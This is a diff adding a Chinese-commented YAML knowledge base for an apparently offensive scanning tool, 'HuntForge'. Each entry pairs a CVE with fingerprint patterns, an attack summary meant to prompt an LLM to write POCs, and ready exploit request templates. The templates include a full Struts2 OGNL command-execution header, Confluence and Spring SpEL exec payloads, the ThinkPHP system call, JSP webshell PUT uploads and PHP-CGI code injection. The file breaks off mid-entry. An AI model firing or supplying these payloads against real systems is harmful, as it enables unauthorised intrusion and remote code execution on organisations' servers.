@@ -1,0 +1,880 @@
+# HuntForge 内置 CVE 知识库（国产组件为主，托管环境无外网 → 离线直击）
+#
+# 每条：
+#   cve       CVE 编号
+#   product   组件/产品
+#   severity  严重度（用于排序）
+#   patterns  指纹正则列表（命中任一即认为组件存在）——匹配对象：
+#             标题(title)/正文(body)/响应头(headers 拼串)/URL 路径(path)
+#   versions  受影响版本特征正则（可选；不写=不校验版本）
+#   attack    攻击路径简述（喂 LLM 编写 POC 时用）
+#   payloads  内置请求模板列表（规则级直击）：{method, path, headers{}, data{}}
+#             占位符 {target} 由引擎替换
+#   confidence 规则直击置信度
+cves:
+  - cve: CVE-2023-34599
+    product: 泛微 e-cology
+    severity: critical
+    patterns: ["e-cology", "weaver", "ecology/", "/wui/theme/ecology", "泛微"]
+    attack: "泛微 e-cology FileDownloadForOutDoc 前台 SQL 注入（MSSQL 报错/时间盲注，POST /weaver/weaver.file.FileDownloadForOutDoc，fileid 注入点）。成熟脚本见 tools/pocs/weaver_sqli/"
+    payloads:
+      - method: POST
+        path: /weaver/weaver.file.FileDownloadForOutDoc
+        headers:
+          Content-Type: application/x-www-form-urlencoded
+        data: "fileid=1+AND+1=CONVERT(int,@@version)&isFromOutImg=1"
+    confidence: 0.7
+
+  - cve: CVE-2023-47460
+    product: 致远 OA
+    severity: high
+    patterns: ["seeyon", "a8", "a6", "致远", "seeyonreport"]
+    attack: "致远 OA 前台任意用户登录/命令注入（/seeyon/ 前缀）"
+    payloads:
+      - method: GET
+        path: /seeyon/htmlofficeservlet
+      - method: GET
+        path: /seeyon/thirdpartyController.do
+    confidence: 0.6
+
+  - cve: CVE-2022-22965
+    product: Spring Framework (Spring4Shell)
+    severity: critical
+    patterns: ["x-application-context", "spring", "springframework", "actuator"]
+    attack: "Spring4Shell RCE：classLoader 参数注入（需要 JDK9+ 且 WAR 部署）"
+    payloads:
+      - method: POST
+        path: /
+        data: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"
+    confidence: 0.4
+
+  - cve: CVE-2021-44228
+    product: Apache Log4j2 (Log4Shell)
+    severity: critical
+    patterns: ["log4j", "log4shell", "apache", "java"]
+    attack: "Log4Shell JNDI 注入：请求头/参数注入 ${jndi:ldap://...}"
+    payloads:
+      - method: GET
+        path: /
+        headers: {"X-Api-Version": "${jndi:ldap://127.0.0.1:1/a}"}
+    confidence: 0.4
+
+  - cve: CVE-2022-22947
+    product: Spring Cloud Gateway
+    severity: critical
+    patterns: ["spring cloud gateway", "gateway", "spring-cloud"]
+    attack: "Spring Cloud Gateway Actuator SpEL 注入 RCE"
+    payloads:
+      - method: POST
+        path: /actuator/gateway/routes/test
+        data: "{\"id\":\"test\",\"filters\":[],\"uri\":\"http://127.0.0.1:1\",\"predicates\":[]}"
+    confidence: 0.5
+
+  - cve: CVE-2021-26084
+    product: Atlassian Confluence
+    severity: critical
+    patterns: ["confluence", "atlassian"]
+    attack: "Confluence OGNL 注入 RCE"
+    payloads:
+      - method: POST
+        path: /pages/createpage-entervariables.action
+        data: "queryString=aaaa\\u0027%2b#{3*3}%2b\\u0027bbbb"
+    confidence: 0.5
+
+  - cve: CVE-2023-28771
+    product: Zyxel 防火墙
+    severity: critical
+    patterns: ["zyxel", "zywall"]
+    attack: "Zyxel 命令注入（无需认证）"
+    payloads:
+      - method: POST
+        path: /cgi-bin/zysh
+        data: "cmd=id"
+    confidence: 0.5
+
+  - cve: CVE-2022-1388
+    product: F5 BIG-IP
+    severity: critical
+    patterns: ["big-ip", "bigip", "f5"]
+    attack: "F5 BIG-IP iControl REST 认证绕过 RCE"
+    payloads:
+      - method: POST
+        path: /mgmt/tm/util/bash
+        headers: {"X-F5-Auth-Token": "x", "Connection": "X-F5-Auth-Token"}
+        data: "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
+    confidence: 0.5
+
+  - cve: CVE-2021-22986
+    product: F5 BIG-IP iControl
+    severity: critical
+    patterns: ["big-ip", "bigip", "f5"]
+    attack: "F5 BIG-IP iControl REST 认证绕过命令执行"
+    payloads:
+      - method: POST
+        path: /mgmt/tm/util/bash
+        data: "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
+    confidence: 0.5
+
+  - cve: CVE-2019-19781
+    product: Citrix ADC/Gateway
+    severity: critical
+    patterns: ["citrix", "netscaler"]
+    attack: "Citrix 目录遍历 RCE（/vpn/../vpns/）"
+    payloads:
+      - method: GET
+        path: /vpn/../vpns/cfg/smb.conf
+    confidence: 0.5
+
+  - cve: CVE-2017-12615
+    product: Apache Tomcat PUT 上传
+    severity: high
+    patterns: ["tomcat", "apache tomcat", "catalina"]
+    attack: "Tomcat PUT 任意文件上传 JSP webshell"
+    payloads:
+      - method: PUT
+        path: /test.jsp/
+        data: "<%out.println(7*7);%>"
+    confidence: 0.5
+
+  - cve: CVE-2016-4437
+    product: Apache Shiro 默认密钥
+    severity: high
+    patterns: ["shiro", "rememberme", "deleteme"]
+    attack: "Shiro RememberMe 默认密钥反序列化（配合 ysoserial）"
+    payloads: []
+    confidence: 0.7
+
+  - cve: CVE-2023-25194
+    product: Apache Kafka Connect
+    severity: high
+    patterns: ["kafka connect", "apache kafka"]
+    attack: "Kafka Connect JNDI 注入 RCE"
+    payloads:
+      - method: POST
+        path: /connectors
+        data: "{\"name\":\"x\",\"config\":{\"connector.class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1/a\"}}"
+    confidence: 0.5
+
+  - cve: CVE-2021-21315
+    product: systeminformation (Node.js)
+    severity: high
+    patterns: ["node.js", "systeminformation", "express"]
+    attack: "systeminformation 命令注入（si.* API 参数）"
+    payloads:
+      - method: GET
+        path: /api/osinfo
+        data: "cid=1|id"
+    confidence: 0.4
+
+  - cve: CVE-2023-27163
+    product: request-baskets SSRF
+    severity: medium
+    patterns: ["request basket", "requestbaskets", "basket"]
+    attack: "request-baskets SSRF（创建 basket 指向内网）"
+    payloads:
+      - method: POST
+        path: /api/baskets/test
+        data: "{\"forward_url\":\"http://127.0.0.1:1/\",\"proxy_response\":true}"
+    confidence: 0.4
+
+  - cve: CVE-2018-7600
+    product: Drupal (Drupalgeddon2)
+    severity: critical
+    patterns: ["drupal"]
+    attack: "Drupal 远程代码执行（表单 API 注入）"
+    payloads: []
+    confidence: 0.6
+
+  - cve: CVE-2023-23752
+    product: Joomla API 泄露
+    severity: medium
+    patterns: ["joomla"]
+    attack: "Joomla 4.x 未授权 API 信息泄露"
+    payloads:
+      - method: GET
+        path: /api/index.php/v1/config/application?public=true
+    confidence: 0.6
+
+  - cve: CVE-2022-26134
+    product: Atlassian Confluence OGNL
+    severity: critical
+    patterns: ["confluence", "atlassian"]
+    attack: "Confluence OGNL 注入 RCE（无需认证）"
+    payloads:
+      - method: GET
+        path: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%27utf-8%27%29%29%7D/
+    confidence: 0.4
+
+  - cve: CVE-2021-41773
+    product: Apache HTTP Server 路径遍历
+    severity: high
+    patterns: ["apache", "httpd"]
+    attack: "Apache 2.4.49 路径遍历 RCE"
+    payloads:
+      - method: GET
+        path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
+    confidence: 0.5
+
+  - cve: CVE-2023-28121
+    product: WooCommerce Payments
+    severity: high
+    patterns: ["woocommerce", "wordpress"]
+    attack: "WooCommerce Payments 认证绕过提权"
+    payloads:
+      - method: GET
+        path: /wp-json/wp/v2/users
+    confidence: 0.4
+
+  - cve: CVE-2023-3460
+    product: Ultimate Member 插件
+    severity: high
+    patterns: ["ultimate member", "wordpress"]
+    attack: "Ultimate Member 插件用户枚举/提权"
+    payloads:
+      - method: GET
+        path: /wp-json/wp/v2/users?per_page=100
+    confidence: 0.4
+
+  - cve: CVE-2020-3452
+    product: Cisco ASA
+    severity: high
+    patterns: ["cisco", "asa", "\\+CSCOE\\+"]
+    attack: "Cisco ASA 任意文件读取"
+    payloads:
+      - method: GET
+        path: /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua
+    confidence: 0.4
+
+  - cve: CVE-2023-34039
+    product: VMware Aria
+    severity: critical
+    patterns: ["vmware", "aria operations"]
+    attack: "VMware Aria Operations SSH 认证绕过"
+    payloads: []
+    confidence: 0.5
+
+  - cve: CVE-2023-38646
+    product: Metabase
+    severity: critical
+    patterns: ["metabase"]
+    attack: "Metabase 认证前 RCE（setup token + JDBC 注入）"
+    payloads:
+      - method: GET
+        path: /api/session/properties
+    confidence: 0.4
+
+  - cve: CVE-2019-7238
+    product: Nexus Repository 3
+    severity: critical
+    patterns: ["nexus", "sonatype"]
+    attack: "Nexus 3 认证前 EL 注入 RCE"
+    payloads: []
+    confidence: 0.5
+
+  - cve: CVE-2021-3156
+    product: sudo 堆溢出（本地提权）
+    severity: high
+    patterns: ["sudo", "cve-2021-3156"]
+    attack: "sudo Baron Samedit 堆溢出提权（本地）"
+    payloads: []
+    confidence: 0.4
+
+  - cve: CVE-2022-0847
+    product: Dirty Pipe（本地提权）
+    severity: high
+    patterns: ["dirty pipe", "cve-2022-0847"]
+    attack: "Linux Dirty Pipe 本地提权"
+    payloads: []
+    confidence: 0.4
+
+  - cve: CVE-2016-5195
+    product: Dirty COW（本地提权）
+    severity: high
+    patterns: ["dirty cow", "cve-2016-5195"]
+    attack: "Linux Dirty COW 本地提权"
+    payloads: []
+    confidence: 0.4
+
+  # ============ 国产 OA/CMS（SRC 定向重点，离线直击）============
+  - cve: WEAVER-BSHSERVLET-RCE
+    product: 泛微 e-cology BshServlet
+    severity: critical
+    patterns: ["weaver", "e-cology", "/wui/", "泛微"]
+    attack: "泛微 e-cology BshServlet 远程命令执行：GET /weaver/bsh.servlet.BshServlet 未授权（旧版本），POST 任意代码执行；成熟 POC 见 tools/pocs/weaver_sqli/"
+    payloads:
+      - method: GET
+        path: /weaver/bsh.servlet.BshServlet
+    confidence: 0.6
+
+  - cve: WEAVER-EOFFICE-UPLOAD
+    product: 泛微 e-office
+    severity: high
+    patterns: ["e-office", "weaver", "泛微"]
+    attack: "泛微 e-office 未授权文件上传（/general/index/UploadFile.php 或 logo 上传），上传 php 后缀 webshell 需双扩展绕过"
+    payloads: []
+    confidence: 0.5
+
+  - cve: SEEYON-AJAX-UPLOAD
+    product: 致远 OA ajax 上传
+    severity: critical
+    patterns: ["seeyon", "致远", "a8", "a6"]
+    attack: "致远 OA ajax.do 任意文件上传（POST /seeyon/autoinstall.do.css/..;/ajax.do 上传 jsp webshell，需 multipart），成熟 POC 见 tools/pocs/seeyon_exp/"
+    payloads:
+      - method: GET
+        path: /seeyon/thirdpartyController.do
+    confidence: 0.6
+
+  - cve: SEEYON-HTMLOFFICE-SSRF
+    product: 致远 OA htmlofficeservlet
+    severity: high
+    patterns: ["seeyon", "致远"]
+    attack: "致远 htmlofficeservlet SSRF/文件读取：/seeyon/htmlofficeservlet?url= 类参数"
+    payloads:
+      - method: GET
+        path: /seeyon/htmlofficeservlet
+    confidence: 0.5
+
+  - cve: YONYOU-NC-FILEREAD
+    product: 用友 NC
+    severity: critical
+    patterns: ["yonyou", "用友", "ncfindweb", "iprealertconfigservice"]
+    attack: "用友 NC NCFindWeb 任意文件读取：GET /NCFindWeb?service=IPreAlertConfigService&filename=web.xml（../ 穿越读任意文件）；同族命令执行接口多种"
+    payloads:
+      - method: GET
+        path: /NCFindWeb?service=IPreAlertConfigService&filename=web.xml
+    confidence: 0.6
+
+  - cve: YONYOU-GRP-U8-SQLI
+    product: 用友 GRP-U8
+    severity: high
+    patterns: ["grp-u8", "用友"]
+    attack: "用友 GRP-U8 SQL 注入（/u8qx/ 相关接口）"
+    payloads: []
+    confidence: 0.4
+
+  - cve: KINGDEE-CLOUD-DESER
+    product: 金蝶云星空
+    severity: critical
+    patterns: ["kingdee", "金蝶", "scpsupreghandler"]
+    attack: "金蝶云星空 ScpSupRegHandler 反序列化 RCE（POST /k3cloud/SRM/ScpSupRegHandler 二进制反序列化 payload）"
+    payloads: []
+    confidence: 0.5
+
+  - cve: TONGDA-OA-UPLOAD-RCE
+    product: 通达 OA
+    severity: critical
+    patterns: ["tongda", "通达", "ispirit"]
+    attack: "通达 OA 任意文件上传 RCE：POST /ispirit/im/upload.php（P 参数绕过鉴权，php 上传 webshell）；v11 系列 action_upload 同族"
+    payloads:
+      - method: GET
+        path: /ispirit/login_code.php
+    confidence: 0.6
+
+  - cve: LANLING-OA-RCE
+    product: 蓝凌 OA
+    severity: critical
+    patterns: ["landray", "蓝凌", "syssearchmain"]
+    attack: "蓝凌 OA 命令执行：POST /sys/ui/extend/varkind/custom.jsp 或 /data/sys-common/treexml.tmpl；sysSearchMain.do 相关接口"
+    payloads:
+      - method: GET
+        path: /sys/ui/extend/varkind/custom.jsp
+    confidence: 0.5
+
+  - cve: WANHU-EZOFFICE
+    product: 万户 ezOFFICE
+    severity: high
+    patterns: ["ezoffice", "万户", "wanhu"]
+    attack: "万户 ezOFFICE 文件上传/命令执行（/defaultroot/ 系列）"
+    payloads: []
+    confidence: 0.4
+
+  - cve: RUOYI-SCHED-RCE
+    product: 若依 RuoYi
+    severity: high
+    patterns: ["ruoyi", "若依"]
+    attack: "若依框架：/druid 未授权监控（CVE-2022-45690 默认口令）+ /actuator 泄露 + 登录后台后定时任务调用目标字符串 RCE（SnakeYAML/JNDI）"
+    payloads:
+      - method: GET
+        path: /druid/index.html
+      - method: GET
+        path: /actuator/env
+    confidence: 0.6
+
+  - cve: JEECG-BOOT-SQLI
+    product: jeecg-boot
+    severity: high
+    patterns: ["jeecg", "jeecgboot"]
+    attack: "jeecg-boot queryFieldBySql SQL 注入（/jmreport/queryFieldBySql 报错注入）"
+    payloads: []
+    confidence: 0.4
+
+  - cve: FINEREPORT-FILEREAD
+    product: 帆软 FineReport
+    severity: high
+    patterns: ["finereport", "帆软", "decision"]
+    attack: "帆软 FineReport 任意文件读取/命令执行（/webroot/decision/ 系列接口，如 ReportServer 旧漏洞）"
+    payloads:
+      - method: GET
+        path: /webroot/decision/view/ReportServer?test=&n=1
+    confidence: 0.4
+
+  - cve: ZENTAO-SQLI
+    product: 禅道 Zentao
+    severity: high
+    patterns: ["zentao", "禅道"]
+    attack: "禅道 SQLi/后台文件写入（历史多个版本；登录后台 → 计划任务/文件管理写 webshell）"
+    payloads: []
+    confidence: 0.4
+
+  - cve: PHPCMS-V9-SQLI
+    product: PHPCMS v9
+    severity: high
+    patterns: ["phpcms"]
+    attack: "PHPCMS v9 SQL 注入（/index.php?m=content&c=down&a=init 等）"
+    payloads: []
+    confidence: 0.4
+
+  - cve: QIZHI-SHTERM-RCE
+    product: 齐治堡垒机
+    severity: critical
+    patterns: ["shterm", "齐治"]
+    attack: "齐治堡垒机 shterm 模块命令注入（/shterm/list 参数注入）"
+    payloads: []
+    confidence: 0.4
+
+  - cve: CVE-2022-42475
+    product: 深信服 SSL VPN
+    severity: critical
+    patterns: ["sangfor", "深信服"]
+    attack: "深信服 SSL VPN 认证前 RCE（POST /api/v1/login 或 userLogin 接口堆溢出/命令注入）"
+    payloads:
+      - method: GET
+        path: /api/v1/login
+    confidence: 0.4
+
+  - cve: CVE-2017-7921
+    product: 海康威视摄像头
+    severity: high
+    patterns: ["hikvision", "海康", "onvif-http"]
+    attack: "海康威视未授权用户枚举与文件读取（/onvif-http/snapshot?auth=YWRtaW46MTEK 管理员凭据读取）"
+    payloads:
+      - method: GET
+        path: /onvif-http/snapshot?auth=YWRtaW46MTEK
+    confidence: 0.5
+
+  - cve: XXL-JOB-EXEC-RCE
+    product: XXL-Job
+    severity: critical
+    patterns: ["xxl-job", "xxljob"]
+    attack: "XXL-Job 执行器未授权 RCE（CVE-2022-36157：POST /run 传 GLUE 代码执行）"
+    payloads: []
+    confidence: 0.5
+
+  - cve: CVE-2021-29441
+    product: Nacos 认证绕过
+    severity: critical
+    patterns: ["nacos"]
+    attack: "Nacos 认证绕过（User-Agent: Nacos-Server 绕过鉴权）+ 默认口令 nacos/nacos + /v1/auth/users 用户列表"
+    payloads:
+      - method: GET
+        path: /nacos/v1/auth/users?pageNo=1&pageSize=9
+        headers: {"User-Agent": "Nacos-Server"}
+    confidence: 0.6
+
+  # ============ 框架 / 中间件 RCE（离线 POC 直击）============
+  - cve: CVE-2022-22963
+    product: Spring Cloud Function SpEL
+    severity: critical
+    patterns: ["spring", "springframework", "functionrouter"]
+    attack: "Spring Cloud Function SpEL 注入 RCE（POST /functionRouter，spring.cloud.function.routing-expression 头）"
+    payloads:
+      - method: POST
+        path: /functionRouter
+        headers: {"spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec('id')"}
+        data: "x"
+    confidence: 0.5
+
+  - cve: CVE-2022-25845
+    product: Fastjson AutoType
+    severity: critical
+    patterns: ["fastjson"]
+    attack: "Fastjson AutoType 反序列化 RCE（1.2.24-1.2.83 各版本 gadget 不同：JdbcRowSetImpl/TemplatesImpl 链）"
+    payloads: []
+    confidence: 0.5
+
+  - cve: CVE-2020-1957
+    product: Apache Shiro 权限绕过
+    severity: high
+    patterns: ["shiro", "rememberme", "deleteme"]
+    attack: "Shiro 权限绕过：/admin/;/ 分号截断绕过拦截器（配合默认 key 反序列化）"
+    payloads:
+      - method: GET
+        path: /admin/;
+    confidence: 0.5
+
+  - cve: S2-045
+    product: Apache Struts2
+    severity: critical
+    patterns: ["struts", "struts2"]
+    attack: "Struts2 S2-045/046 Content-Type OGNL 注入 RCE（Content-Type 头带 %{...}）；S2-057 namespace 注入；S2-061 同族"
+    payloads:
+      - method: POST
+        path: /
+        headers: {"Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"}
+        data: "x"
+    confidence: 0.4
+
+  - cve: CVE-2020-14882
+    product: Oracle WebLogic 未授权 RCE
+    severity: critical
+    patterns: ["weblogic"]
+    attack: "WebLogic 未授权 RCE（/console/css/%252e%252e%252fconsole.portal 访问管理台，配合 14883 命令执行）"
+    payloads:
+      - method: GET
+        path: /console/css/%252e%252e%252fconsole.portal
+    confidence: 0.5
+
+  - cve: CVE-2017-12149
+    product: JBoss 反序列化
+    severity: critical
+    patterns: ["jboss"]
+    attack: "JBoss JMXInvokerServlet 未授权反序列化 RCE（/invoker/JMXInvokerServlet POST 序列化对象）"
+    payloads:
+      - method: GET
+        path: /invoker/JMXInvokerServlet
+    confidence: 0.5
+
+  - cve: CVE-2020-1938
+    product: Tomcat AJP Ghostcat
+    severity: high
+    patterns: ["tomcat", "catalina"]
+    attack: "Tomcat AJP Ghostcat 文件读取/包含（8009 端口 AJP 协议，本地工具直连）"
+    payloads: []
+    confidence: 0.5
+
+  - cve: CVE-2018-1000861
+    product: Jenkins
+    severity: critical
+    patterns: ["jenkins"]
+    attack: "Jenkins script console RCE（登录后 /script 执行 Groovy）；CVE-2024-23897 未授权任意文件读取"
+    payloads:
+      - method: GET
+        path: /script
+    confidence: 0.5
+
+  - cve: CVE-2021-22205
+    product: GitLab ExifTool RCE
+    severity: critical
+    patterns: ["gitlab"]
+    attack: "GitLab 未授权 ExifTool RCE（POST /uploads/user 传恶意图片元数据）"
+    payloads: []
+    confidence: 0.5
+
+  - cve: CVE-2021-43798
+    product: Grafana 任意文件读取
+    severity: high
+    patterns: ["grafana"]
+    attack: "Grafana 8.x 任意文件读取（/public/plugins/<plugin>/../../../../etc/passwd）"
+    payloads:
+      - method: GET
+        path: /public/plugins/alertlist/../../../../../../../../etc/passwd
+    confidence: 0.6
+
+  - cve: THINKPHP-5-RCE
+    product: ThinkPHP 5.x
+    severity: critical
+    patterns: ["thinkphp"]
+    attack: "ThinkPHP 5.0.23 RCE（/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id，需未开启强制路由）"
+    payloads:
+      - method: GET
+        path: /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+    confidence: 0.5
+
+  - cve: CVE-2021-3129
+    product: Laravel Ignition RCE
+    severity: critical
+    patterns: ["laravel"]
+    attack: "Laravel 8 Ignition 调试模式 RCE（/_ignition/execute-solution 写日志 → phar 反序列化）"
+    payloads:
+      - method: GET
+        path: /_ignition/health-check
+    confidence: 0.4
+
+  - cve: CVE-2017-9841
+    product: PHPUnit eval
+    severity: critical
+    patterns: ["phpunit"]
+    attack: "PHPUnit 残留 eval-stdin.php RCE（POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 执行 PHP）"
+    payloads:
+      - method: POST
+        path: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+        data: "<?php system('id');?>"
+    confidence: 0.6
+
+  - cve: CVE-2019-16759
+    product: vBulletin 认证前 RCE
+    severity: critical
+    patterns: ["vbulletin"]
+    attack: "vBulletin 5.x 认证前 RCE（POST /ajax/render/widget_php 参数注入）"
+    payloads: []
+    confidence: 0.4
+
+  - cve: CVE-2017-12629
+    product: Apache Solr XXE/SSRF
+    severity: high
+    patterns: ["solr"]
+    attack: "Solr XXE/SSRF（/solr/<core>/select 与 runExecutableListener）；CVE-2019-17558 Velocity 模板注入 RCE"
+    payloads: []
+    confidence: 0.5
+
+  - cve: CVE-2015-1427
+    product: Elasticsearch Groovy RCE
+    severity: critical
+    patterns: ["elasticsearch"]
+    attack: "Elasticsearch 1.4.x Groovy 沙箱逃逸 RCE（/_search?source= 注入 script_fields）"
+    payloads: []
+    confidence: 0.4
+
+  - cve: CVE-2019-7609
+    product: Kibana 原型污染 RCE
+    severity: critical
+    patterns: ["kibana"]
+    attack: "Kibana 6.x 原型污染 RCE（Timelion 表达式 payload）"
+    payloads: []
+    confidence: 0.4
+
+  - cve: CVE-2023-28432
+    product: MinIO 信息泄露
+    severity: high
+    patterns: ["minio"]
+    attack: "MinIO 未授权集群信息泄露（POST /minio/bootstrap/v1/verify 回显环境变量/密钥）"
+    payloads:
+      - method: POST
+        path: /minio/bootstrap/v1/verify
+    confidence: 0.6
+
+  - cve: CVE-2019-16097
+    product: Harbor 未授权建管理员
+    severity: critical
+    patterns: ["harbor"]
+    attack: "Harbor 1.7-1.8 未授权创建管理员（POST /api/users 无鉴权）"
+    payloads:
+      - method: POST
+        path: /api/users
+        data: "{\"username\":\"x\",\"password\":\"X12345678\",\"email\":\"x@x.com\"}"
+    confidence: 0.5
+
+  - cve: DOCKER-API-UNAUTH
+    product: Docker API 未授权
+    severity: critical
+    patterns: ["docker", "2375"]
+    attack: "Docker 2375 未授权 API → 创建特权容器挂载宿主机文件系统逃逸"
+    payloads:
+      - method: GET
+        path: /version
+    confidence: 0.5
+
+  - cve: CVE-2016-3088
+    product: ActiveMQ fileserver
+    severity: critical
+    patterns: ["activemq"]
+    attack: "ActiveMQ fileserver 任意文件写入（PUT /fileserver/ 上传 jsp webshell）"
+    payloads:
+      - method: PUT
+        path: /fileserver/x.jsp
+        data: "<%out.println(7*7);%>"
+    confidence: 0.5
+
+  - cve: REDIS-UNAUTH
+    product: Redis 未授权
+    severity: critical
+    patterns: ["redis", "6379"]
+    attack: "Redis 未授权 → 写 crontab 反弹/写 webshell（gopher 协议 SSRF 场景同样适用）"
+    payloads: []
+    confidence: 0.5
+
+  - cve: MEMCACHED-UNAUTH
+    product: Memcached 未授权
+    severity: high
+    patterns: ["memcached", "11211"]
+    attack: "Memcached 未授权读写（stats/items/cachedump 泄露会话与缓存数据）"
+    payloads: []
+    confidence: 0.4
+
+  - cve: FLASK-DEBUG-PIN
+    product: Flask Debugger PIN
+    severity: high
+    patterns: ["werkzeug", "flask"]
+    attack: "Flask/Werkzeug 调试模式 PIN 猜解 RCE（machine-id/boot_id/username 组合爆破 PIN 后 /console 任意代码执行）"
+    payloads:
+      - method: GET
+        path: /console
+    confidence: 0.4
+
+  - cve: UE-KINDEDITOR-UPLOAD
+    product: UEditor/KindEditor 上传
+    severity: high
+    patterns: ["ueditor", "kindeditor"]
+    attack: "UEditor .NET 版任意文件上传（/ueditor/net/controller.ashx?action=catchimage 传 .asmx webshell）；KindEditor fileManager 未授权上传"
+    payloads: []
+    confidence: 0.4
+
+  - cve: DRUPAL-CVE-2018-7602
+    product: Drupal RCE
+    severity: critical
+    patterns: ["drupal"]
+    attack: "Drupal 7/8 远程代码执行（CVE-2018-7600/7602 表单 API 注入，POST user/register）"
+    payloads: []
+    confidence: 0.5
+
+  - cve: WORDPRESS-REST-ENUM
+    product: WordPress REST 枚举
+    severity: medium
+    patterns: ["wordpress", "wp-json"]
+    attack: "WordPress REST 用户枚举（/wp-json/wp/v2/users）+ xmlrpc.php 爆破 + 常见插件（Elementor/Revolution Slider 文件读取）"
+    payloads:
+      - method: GET
+        path: /wp-json/wp/v2/users
+    confidence: 0.5
+
+  - cve: DISCUZ-UC-KEY-RCE
+    product: Discuz! X
+    severity: critical
+    patterns: ["discuz"]
+    attack: "Discuz! X3.x UC_KEY 泄漏 → uc.php 任意代码执行（authcode 加解密）"
+    payloads: []
+    confidence: 0.4
+
+  # ---------- 2024-2026 高价值新条目（指纹 → 请求模板 → LLM 写 POC / nuclei 定向） ----------
+
+  - cve: CVE-2025-29927
+    product: Next.js
+    severity: critical
+    patterns: ["next.js", "nextjs", "__next", "_next/", "x-middleware", "next-router", "next-auth"]
+    attack: "Next.js 中间件认证绕过（<15.2.3 全部版本）：加请求头 x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware 跳过 middleware 鉴权直接访问受保护页面/接口（middleware 里做的登录校验整体失效）；优先打后台首页、API 路由。修复版本仅限 15.2.3。"
+    payloads:
+      - method: GET
+        path: /
+        headers:
+          x-middleware-subrequest: "middleware:middleware:middleware:middleware:middleware"
+    confidence: 0.5
+
+  - cve: CVE-2025-24813
+    product: Apache Tomcat
+    severity: critical
+    patterns: ["apache-tomcat", "tomcat", "catalina", "jsessionid"]
+    attack: "Tomcat 9.0.0.M1-9.0.98 / 10.1.0-M1-10.1.34 / 11.0.0-M1-11.0.2 部分 PUT RCE：默认 servlet 写使能（readonly=false）时，PUT 上传序列化 session 文件（路径 /session 指定 JSESSIONID）→ 反序列化链 RCE；配置开启 write 时亦可 PUT 写 JSP。先 PUT 探测返回码（201/204=可写），再选链。"
+    payloads:
+      - method: PUT
+        path: /session.jsp
+        data: "<%out.println(1);%>"
+    confidence: 0.4
+
+  - cve: CVE-2025-1974
+    product: ingress-nginx (Kubernetes)
+    severity: critical
+    patterns: ["ingress-nginx", "nginx-ingress", "kubernetes/ingress", "admission"]
+    attack: "ingress-nginx AdmissionReview 控制器 RCE（<1.11.0 / 1.12.1）：能触达准入 webhook（或 k8s API 未授权可创建 ingress）时，用 ssl_error 注解 / 镜像注入打进控制器容器，逃逸拿集群凭据。多阶段内网场景 K8s 暴露时优先探测。"
+    payloads:
+      - method: GET
+        path: /apis/networking.k8s.io/v1/ingresses
+    confidence: 0.3
+
+  - cve: CVE-2025-30208
+    product: Vite
+    severity: high
+    patterns: ["vite", "vitejs", "@vite/client", "/@fs", "__vite", "vite-plugin"]
+    attack: "Vite 开发服务器任意文件读取（<6.2.3 / 5.4.14 / 4.5.10 等）：/@fs/ 路径直接读任意文件（含 /challenge/flag.txt 类路径），?raw / ?import 导入逃逸同理；内网 dev 端口 5173 常见暴露。读 env/配置/flag。"
+    payloads:
+      - method: GET
+        path: /@fs/etc/passwd
+      - method: GET
+        path: /@fs/challenge/flag.txt
+    confidence: 0.5
+
+  - cve: CVE-2024-37032
+    product: Ollama
+    severity: high
+    patterns: ["ollama"]
+    attack: "Ollama <0.1.34 路径穿越 RCE：/api/pull 的 digest 字段带 ../../ 把恶意 manifest 落到任意可写路径 → 部署恶意 model → /api/chat 触发；或利用已注册 model 的代理指向攻击者服务。AI 组件（LLM 推理服务）场景首选，先 GET /api/version 判版本。"
+    payloads:
+      - method: GET
+        path: /api/version
+    confidence: 0.4
+
+  - cve: CVE-2024-4577
+    product: PHP (Windows CGI)
+    severity: critical
+    patterns: ["php-cgi", "php-cgi.exe", "xampp", "php/8", "php.exe"]
+    attack: "PHP Windows CGI 参数注入（<8.1.29/8.2.20/8.3.8，XAMPP 默认）：URL 用 %ADd 绕过转义注入 -d 参数 → allow_url_include=1 + auto_prepend_file=php://input 拿 RCE。Windows + PHP CGI 模式即试。"
+    payloads:
+      - method: POST
+        path: "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
+        data: "<?php echo 'pwned'; ?>"
+    confidence: 0.4
+
+  - cve: CVE-2024-38856
+    product: Apache OFBiz
+    severity: critical
+    patterns: ["ofbiz", "apache-ofbiz", "webtools"]
+    attack: "Apache OFBiz <18.12.15 预认证 RCE：POST /webtools/control/ProgramExport，groovyProgram 参数拼接注入（白名单被绕过）；/webtools/control/forgotPassword 亦曾可绕过鉴权。先打 ProgramExport。"
+    payloads:
+      - method: POST
+        path: /webtools/control/ProgramExport
+        headers:
